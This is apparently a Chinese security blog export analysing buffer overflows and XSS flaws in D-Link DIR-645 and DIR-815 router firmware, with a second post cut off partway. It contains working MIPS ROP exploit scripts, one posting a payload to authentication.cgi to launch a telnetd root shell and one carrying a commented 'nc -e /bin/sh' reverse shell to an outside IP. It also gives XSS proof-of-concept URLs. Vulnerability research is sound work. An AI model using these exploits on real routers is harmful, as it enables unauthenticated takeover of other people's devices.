<h4 id="通过system函数getshell"><a href="#通过system函数getshell" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>整个流程如下，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102945201.png" alt=""></p>
<p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python2</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>
base_addr <span class="token operator">=</span> <span class="token number">0x7f738000</span>
system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
padding <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">292</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span> 
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
padding <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
padding <span class="token operator">+=</span> p32<span class="token punctuation">(</span>base_addr <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
padding <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
padding <span class="token operator">+=</span> <span class="token string">'/bin/sh'</span>

<span class="token keyword">print</span> padding</code></pre>
<p>构造脚本调试</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
mkdir ./var/run
#python -c "print open('context','r').read(400)" | tr -d '\n' > ./var/run/hash
python exp.py | tr -d '\n' > ./var/run/hash
echo -n 'aaaa' > temp
cp $(which qemu-mipsel-static) ./qemu 
chroot . ./qemu /usr/sbin/widget -a temp
rm -f ./qemu
rm -rf ./var/run</code></pre>
<p>能够成功getshell。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200607214419824.png" alt=""></p>
<h1 id="Buffer-overflow-on-“hedwig-cgi”"><a href="#Buffer-overflow-on-“hedwig-cgi”" class="headerlink" title="Buffer overflow on “hedwig.cgi”"></a>Buffer overflow on “hedwig.cgi”</h1><p>跟之前分析的DIR815目标一样都是hedwig.cgi，而且漏洞产生原因都是超长的cookie，所以调试过程几乎一样，唯一的区别可能是偏移会不同，调试脚本test.sh如下：</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash
#sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`

INPUT="$1"
COOKIE="$2"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu

echo $INPUT | sudo chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E HTTP_COOKIE=$COOKIE -E REQUEST_URI="/hedwig.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/hedwig.cgi
rm -f ./qemu</code></pre>
<p>也需要提前在<code>/var</code>文件夹下创建<code>/tmp</code>文件夹否则到不了真正的漏洞触发函数第二个<code>sprintf()</code>，还需要利用<code>patternLocOffset.py</code>脚本创建content文件计算偏移，</p>
<p><code>./patternLocOffset.py -c -l 2000 -f content</code></p>
<p>之后利用<code>tesh.sh</code>结合gdb-multiarch或者IDA进行远程调试计算偏移，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./test.sh  "uid=1234"  `python -c "print 'uid=' + open('content','r').read()"`</code></pre>
<p>具体调试过程跟<a href="https://www.anquanke.com/post/id/206626#h3-7" target="_blank" rel="noopener">DIR815缓冲区溢出漏洞再分析</a>过程一样，调试发现偏移也是1009，这样的话整个exp也跟815完全一样，经测试确实如此。</p>
<h1 id="Buffer-overflow-on-“authentication-cgi”"><a href="#Buffer-overflow-on-“authentication-cgi”" class="headerlink" title="Buffer overflow on “authentication.cgi”"></a>Buffer overflow on “authentication.cgi”</h1><h2 id="漏洞介绍-2"><a href="#漏洞介绍-2" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><blockquote>
<pre><code>Buffer overflow on "authentication. cgi"
The third buffer overflow vulnerability affects the "authentication. cgi"CGI script. This time the issue affects the HTTP POST paramter named "password". Again, this vulnerability can be abused to achieve remote code execution. As for all the previous issues, no authentication is required.</code></pre></blockquote>
<p>该缓冲区溢出漏洞存在于<code>authentication. cgi</code>脚本中，产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>参数值过长，攻击者能够利用该漏洞在<strong>不需要身份验证</strong>条件下<strong>远程命令执行</strong>。</p>
<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><code>binwalk -Me</code>解压之后，根据漏洞介绍可知，目标文件是<code>authentication. cgi</code>脚本，<code>find . -name 'authentication.cgi'</code>查找文件，并<code>ls -l ./htdocs/web/authentication.cgi</code>发现该cgi文件是指向./htdocs/cgibin的符号链接，真正的目标文件在cgibin中。   </p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200529190127079.png" alt=""></p>
<p>因为溢出的产生原因是HTTP的<strong>POST</strong>参数中<strong>password</strong>值过长，所以调试脚本<code>run.sh</code>如下：post数据可以通过<code>echo 'xxxx' |</code>传入。</p>
<pre class=" language-sh"><code class="language-sh">#!/bin/bash

INPUT="$1"
PORT="23957"
LEN=$(echo -n "$INPUT" | wc -c)
cp $(which qemu-mipsel-static) ./qemu
echo $INPUT | chroot . ./qemu -E CONTENT_LENGTH=$LEN -E CONTENT_TYPE="application/x-www-form-urlencoded" -E REQUEST_METHOD="POST" -E REQUEST_URI="/authentication.cgi" -E REMOTE_ADDR="127.0.0.1" -g $PORT /htdocs/web/authentication.cgi
rm -f ./qemu</code></pre>
<h3 id="定位漏洞函数"><a href="#定位漏洞函数" class="headerlink" title="定位漏洞函数"></a>定位漏洞函数</h3><p>直接通过调试定位漏洞，</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*2000"`</code></pre>
<p>因为处理的是<code>authentication.cgi</code>脚本，IDA打开<code>cgibin</code>之后，定位到authenticationcgi_main函数在0x0040B01C，并在该处下断点，单步调试，ra存储在0x76FFF07c处，观察该处的内容何时被覆盖。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530095830139.png" alt=""></p>
<p>继续执行，发现运行完read()函数后，0x76FFF07c处的返回值被覆盖，该处的read()很可能是溢出点。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100150526.png" alt=""></p>
<p>继续运行到0x0040B514处<code>jal     sub_40A424</code>，进入sub_40A424后执行其中的getenv函数时报错。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100541572.png" alt=""></p>
<p>查看报错位置代码<code>lbu     $v0, 0($a1)</code>，读取a1寄存器中地址指向的数据，此时a1寄存器中值为0x41414141，无法访问该地址，这个问题应该是在运行过程中覆盖了栈上的内容，然后再赋值给a1寄存器造成的。我们尝试减小POST数据长度。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530100718738.png" alt=""></p>
<p>发现长度为1200时，能够解决该问题。</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'A'*1200"`</code></pre>
<p>但是继续运行会出现下面的问题，运行到0x40B588处时，<code>lb      $v0, 0($a2)</code>报错，此时a2中值为3，无法访问该地址。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530102300143.png" alt=""></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530102318534.png" alt=""></p>
<p>经过调试分析，原因是在0x40B55C处，程序执行两次strstr来分别定位字符串<code>id=</code>和<code>password=</code>。如果post数据中不含这两个定位符则会报上面的错。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530103633469.png" alt=""></p>
<p>结合ghidra反编译结果如下，也能看出执行了两次strstr。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530110540977.png" alt=""></p>
<p>所以post数据中必须含有<code>id=</code>和<code>password=</code>这两个字符串，</p>
<p>sudo ./run.sh <code>python -c "print 'id=password='+'A'*1200"</code></p>
<p>以下是调试strstr函数过程，在第一次strstr时,a1的值为s0指向‘id=’字符串，也就是通过strstr定位我们post数据中的’id=’的位置。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530111944620.png" alt=""></p>
<p>接下来是循环判断’id=’后面的字符串是否存在字符‘&amp;’（0x26)，直到遇到结束符’\0’。这样就得到了‘id=’之后字符串的长度0x4B9=1209=len(1200*‘A’+’password=’)，该长度是0x40B5C4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE718，’id=’之后的内容，0x4B9)。也就是将’id=’之后的内容拷贝进0x76FFE718处。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530160739137.png" alt=""></p>
<p>第二次strstr函数就是定位’password=’字符串的位置，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530162026794.png" alt=""></p>
<p>接下来循环判断’password=’后面的字符串中是否‘&amp;’(0x26)字符，直到遇到结束符’\0’。这样就得到了‘password=’之后字符串的长度0x4B0=1200=len(1200*’A’)，该长度是0x40B5E4处strncpy的第三个参数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)。也就是将’password=’之后的内容拷贝进0x76FFE798处。这样会覆盖之前第一次strncpy的结果。那么这里的strncpy函数也很可能是漏洞溢出点。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530163523462.png" alt=""></p>
<p>继续运行,能正常运行authenticationcgi_main函数返回值处0x40BCE0处，且ra被覆盖成了’AAAA’。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530163944388.png" alt=""></p>
<p>分析到这里可以确定的事情有，</p>
<ul>
<li>发送的post数据长度不能过长，1200能满足程序正常运行到返回且能覆盖返回地址。</li>
<li>post数据中需要包含’id=’和’password=’这两个字符串。</li>
<li>read()和0x40B5E4处strncpy函数都可能是漏洞触发函数。</li>
</ul>
<p>接下来分析真正的漏洞触发函数，先分析下read(),</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200530170446785.png" alt=""></p>
<p>read从stdin（标准输入设备）读取长度为HTTP协议中content_length值的数据，然后写入栈中变量var_430，而该长度只有0x400，并且没有限制content_length值，所以可以造成缓冲区溢出。</p>
<p>read(fileno(stream)，栈上内容var_430大小为0x400，atoi(getenv(‘content_length’)))。</p>
<p>再是0x40B5E4处strncpy函数，</p>
<p>strncpy(栈上地址0x76FFE798，password=’之后的内容，0x4B0)，</p>
<p>函数是从0x76FFF07c开始覆盖，如果覆盖到存放返回值ra的栈地址0x76FFF07c，需要覆盖0x76FFF07c-0x76FFE798=0x8e4=2276字节的缓冲区，而之前2000个’A‘就提前报错了，所以0x40B5E4处strncpy()肯定不是漏洞触发点。这样就确定了read()函数是真正的漏洞触发函数。</p>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="劫持PC，确定偏移-1"><a href="#劫持PC，确定偏移-1" class="headerlink" title="劫持PC，确定偏移"></a>劫持PC，确定偏移</h3><p>利用patternLocOffset.py生成context文件，包含特定格式的2000个字符串。</p>
<p><code>python patternLocOffset.py -c -l 2000 -f context</code></p>
<p>执行命令：</p>
<pre class=" language-sh"><code class="language-sh">sudo ./run.sh `python -c "print 'id=password='+open('context','r').read(1200)"`</code></pre>
<p>使用IDA或者gdb-multiarch联调运行到authenticationcgi_main()返回时ra寄存器中的值为0x42326A42。</p>
<p><code>./patternLocOffset.py -s 0x42326A42 -l 2000</code>确定偏移为1056。</p>
<h3 id="选择攻击路径构造ROP链-1"><a href="#选择攻击路径构造ROP链-1" class="headerlink" title="选择攻击路径构造ROP链"></a>选择攻击路径构造ROP链</h3><p>先找到调用了哪个动态链接库libc.so，然后找到其基地址：</p>
<pre class=" language-sh"><code class="language-sh">gdb-multiarch htdocs/cgibin #一定要加载文件htdocs/cgibin不然vmmap得不到结果
set architecture mips
target remote :23957
b *0040BCE0  #authenticationcgi_main()函数返回jr ra处
c
vmmap</code></pre>
<p>调试发现qemu用户模式使用的libc和DIR815相同都是libuClibc-0.9.30.1.so且基地址都为0x76738000。</p>
<pre class=" language-sh"><code class="language-sh">Breakpoint *0x0040BCE0
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
  0x400000   0x401000 rwxp     1000 0      /htdocs/web/authentication.cgi
  0x401000   0x423000 r-xp    22000 1000   /htdocs/web/authentication.cgi
  0x423000   0x433000 ---p    10000 23000  /htdocs/web/authentication.cgi
  0x433000   0x435000 rw-p     2000 23000  /htdocs/web/authentication.cgi
0x76738000 0x76739000 rwxp     1000 0      645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so
0x76739000 0x76796000 r-xp    5d000 1000   645/_dir645_FW_103.bin.extracted/squashfs-root/lib/libuClibc-0.9.30.1.so</code></pre>
<p>而且在authenticationcgi_main()函数返回时也能覆盖fp,s0-s7,ra寄存器，所以接下来构造rop过程跟DIR815也是一样。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531102820083.png" alt=""></p>
<h4 id="通过system函数getshell-1"><a href="#通过system函数getshell-1" class="headerlink" title="通过system函数getshell"></a>通过system函数getshell</h4><p>构造的exp如下：</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>endian <span class="token operator">=</span> <span class="token string">"little"</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"mips"</span>

<span class="token keyword">import</span> requests
<span class="token keyword">import</span> sys

<span class="token keyword">def</span> <span class="token function">get_payload</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> libc_base<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span><span class="token punctuation">:</span>
    gadget1 <span class="token operator">=</span> <span class="token number">0x45988</span>
    gadget2 <span class="token operator">=</span> <span class="token number">0x159cc</span>
    system_addr_1 <span class="token operator">=</span> <span class="token number">0x53200</span><span class="token operator">-</span><span class="token number">1</span>
    payload <span class="token operator">=</span> <span class="token string">'A'</span> <span class="token operator">*</span> offset
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> system_addr_1<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># s0</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget2<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># s1</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s2</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s3</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s4</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                           <span class="token comment" spellcheck="true"># s5</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s6</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># s7</span>
    payload <span class="token operator">+=</span> <span class="token string">'A'</span> <span class="token operator">*</span> <span class="token number">4</span>                        <span class="token comment" spellcheck="true"># fp</span>
    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>libc_base <span class="token operator">+</span> gadget1<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># ra</span>
    payload <span class="token operator">+=</span> <span class="token string">'B'</span> <span class="token operator">*</span> <span class="token number">0x10</span>
    payload <span class="token operator">+=</span> cmd
    <span class="token keyword">return</span> payload

<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    <span class="token comment" spellcheck="true">#cmd = "nc -e /bin/sh 192.168.0.122 9999"</span>
    cmd <span class="token operator">=</span> <span class="token string">'telnetd -p 222 -l /bin/sh'</span>
    data <span class="token operator">=</span> <span class="token string">'id=password='</span><span class="token operator">+</span>get_payload<span class="token punctuation">(</span><span class="token number">1056</span><span class="token operator">-</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x2aaf8000</span><span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>
    <span class="token keyword">print</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
    header <span class="token operator">=</span> <span class="token punctuation">{</span>
        <span class="token string">'Content-Type'</span>  <span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">,</span>
        <span class="token string">'Content-Length'</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">}</span>
    ip_port<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>
    url<span class="token operator">=</span><span class="token string">"http://"</span><span class="token operator">+</span>ip_port<span class="token operator">+</span><span class="token string">"/authentication.cgi"</span>
    r<span class="token operator">=</span>requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span></code></pre>
<p>直接利用Firmadyne仿真环境进行测试，</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531103941133.png" alt=""></p>
<p>测试结果显示能够让目标机执行<code>telnetd -p 222 -l /bin/sh</code>。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531104249650.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bind-php”"><a href="#Cross-site-scripting-on-“bind-php”" class="headerlink" title="Cross-site scripting on “bind.php”"></a>Cross-site scripting on “bind.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/parentalcontrols/bind.php</code></p>
<p>获取get表单中deviceid的内容并echo，典型的XSS。</p>
<p>81行    <code>welcome/?device_id=&lt;? echo $_GET["deviceid"];?&gt;';" /&gt;&amp;nbsp;&amp;nbs</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531214731796.png" alt=""></p>
<p>构造’?deviceid=<code>"/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;</code>‘其中“/&gt;是为了闭合前面&lt;“，之后直接加入<code>&lt;script&gt;alert('xss')&lt;/script&gt;</code>即可，后面也可以加入’&lt;’匹配之后的’/&gt;’。</p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/parentalcontrols/bind.php?deviceid="/&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531211900473.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“info-php”"><a href="#Cross-site-scripting-on-“info-php”" class="headerlink" title="Cross-site scripting on “info.php”"></a>Cross-site scripting on “info.php”</h1><p><code>find . -name "bind.php"</code>，文件在<code>/htdocs/webinc/js/info.php</code></p>
<p>21行 <code>$title    = "ACTION ".$_GET["RESULT"];</code></p>
<p>30行 <code>echo "\t\tBODY.ShowMessage(\"".$title."\", msgArray);\n";</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531214052808.png" alt=""></p>
<p>获取get表单中RESULT的内容给title，之后echo，也是XSS。可以用<code>",msgArray);</code>闭合ShowMessage函数，然后再alert(‘xss’),最后用//注释掉后面代码。</p>
<p>poc：</p>
<p><code>http://&lt;target ip&gt;/info.php?RESULT=",msgArray);alert('xss');//</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531211655181.png" alt=""></p>
<h1 id="Cross-site-scripting-on-“bsc-sms-send-php”"><a href="#Cross-site-scripting-on-“bsc-sms-send-php”" class="headerlink" title="Cross-site scripting on “bsc_sms_send.php”"></a>Cross-site scripting on “bsc_sms_send.php”</h1><p><code>find . -name "bsc_sms_send.php"</code>，文件在<code>/htdocs/webinc/body/bsc_sms_send.php</code></p>
<p>其中的18行XSS漏洞。</p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531213336975.png" alt=""></p>
<p>poc:</p>
<p><code>http://&lt;target ip&gt;/bsc_sms_send.php?receiver="/&gt;&lt;script&gt;alert('xss');&lt;/script&gt;&lt;div</code></p>
<p><img src="https://pup2y.github.io/2020/05/29/dir645-huan-chong-qu-yi-chu-fen-xi/image-20200531212954993.png" alt=""></p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><p>揭秘家用路由器0day挖掘技术</p>
<p><a href="https://larry.ngrep.me/2018/05/16/dlink-dir-645-post-login-xml-bof/" target="_blank" rel="noopener">D-Link DIR-645 post_login.xml BoF</a></p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>]]></content>
      <categories>
        <category>iot</category>
      </categories>
      <tags>
        <tag>dlink</tag>
        <tag>dir-645</tag>
      </tags>
  </entry>
  <entry>
    <title>DIR815缓冲区溢出漏洞再分析</title>
    <url>/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/</url>
    <content><![CDATA[<h1 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h1><blockquote>
<p>Buffer overflow on “hedwig.cgi”<br>Another buffer overflow affects the “hedwig.cgi” CGI script. Unauthenticated remote attackers can invoke this CGI with an overly-long cookie value that can overflow a program buffer and overwrite the saved program address.</p>
</blockquote>
<p>从漏洞公告中可以看出，该漏洞存在于名为<strong>“hedwig.cgi”</strong>的CGI脚本中，未认证攻击者通过调用这个CGI脚本传递一个<strong>超长的Cookie值</strong>，使得程序<strong>栈溢出</strong>，从而获得路由器的远程控制权限。</p>
<h1 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h1><ul>
<li>ubuntu16.04 x64虚拟机：安装了常用的pwn环境，binwalk等工具用于路由器固件调试分析</li>
<li>IDA6.8：静态分析同时安装mipsrop插件寻找rop链，与gdb进行动态调试</li>
<li>Ghidra：反汇编反编译mips架构程序，目前只用于静态分析</li>
<li>qemu2.5：利用qemu的用户和系统模式运行固件</li>
<li>gdbserver：利用大佬已经编译好的<a href="https://github.com/rapid7/embedded-tools/blob/master/binaries/gdbserver/gdbserver.mipsle" target="_blank" rel="noopener">gdbserver</a>，也可以自己编译生成</li>
<li>Firmadyne：全系统仿真工具，模拟运行路由器固件，本质还是基于qemu的系统模式</li>
<li>D-Link DIR-815 v1.01路由器实体机：用于测试分析结果</li>
<li>固件下载：<a href="ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP">ftp://ftp2.dlink.com/PRODUCTS/DIR-815/REVA/DIR-815_FIRMWARE_1.01.ZIP</a></li>
</ul>
<h1 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h1><p><code>binwalk -Me</code>解压 </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/binwalk.png" alt="">  </p>
<p>该漏洞的核心组件为hedwig.cgi，<code>find . -name &#39;*cgi&#39;</code>查找文件，并<code>ls -l ./htdocs/web/hedwig.cgi</code>发现hedwig.cgi是指向./htdocs/cgibin的符号链接，也就是说真正的漏洞代码在cgibin中。   </p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/find-name.png" alt=""></p>
<p>由之前的漏洞介绍可以知道<code>HTTP_COOKIE</code>过长导致漏洞，分别用IDA和ghidra打开cgibin这个文件，在string窗口中进行搜索<code>HTTP_COOKIE</code>。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/http_cookie.png" alt=""></p>
<p>可以找到有一个<code>sess_get_uid</code>函数，这个<a href="https://pup2y.github.io/2020/05/19/d-linkzhong-sobj-lei-han-shu-ni-xiang-fen-xi/">帖子</a>分析了这个函数，就是提取<code>HTTP_COOKIE</code>里面的<code>uid=</code>之后的部分。交叉引用一下，找到了<code>hedwigcgi_main</code>函数。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sess_get_uidref.png" alt=""></p>
<p>利用Ghidra反汇编<code>hedwigcgi_main</code>函数，可以定位到其中的<code>sprintf</code>函数引起了栈溢出。<code>hedwigcgi_main</code>函数通过<code>sess_get_uid()</code>获取到<code>HTTP_COOKIE</code>中<code>uid=</code>之后的值，并将该内容按照<code>sprintf</code>函数中格式化字符串给定的形式拷贝到栈中，由于没有检测并限制输入的大小，导致栈溢出。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf1.png" alt=""></p>
<p>但是继续往后看该函数中后面还有一个<code>sprintf</code>函数，第四个参数同样是<code>HTTP_COOKIE</code>中<code>uid=</code>后面的内容，如果可以执行到该<code>sprintf</code>函数则能覆盖之前<code>sprintf</code>函数栈上的内容，同样能够达到缓冲区溢出的目的。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/sprintf2.png" alt=""></p>
<p>在《揭秘家用路由器0day漏洞挖掘技术》一书中写到，如果在文件系统中手工创建<code>/var/tmp</code>文件夹，就能够到达第二个<code>sprintf</code>函数。我对比了下有无<code>/var/tmp</code>文件夹的返回结果:</p>
<p>无<code>/var/tmp</code>，返回unable to open temp file。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp.png" alt=""></p>
<p>有<code>/var/tmp</code>，返回no xml data。</p>
<p><img src="https://pup2y.github.io/2020/05/22/dir815-huan-chong-qu-yi-chu-lou-dong-zai-fen-xi/var-tmp2.png" alt=""></p>
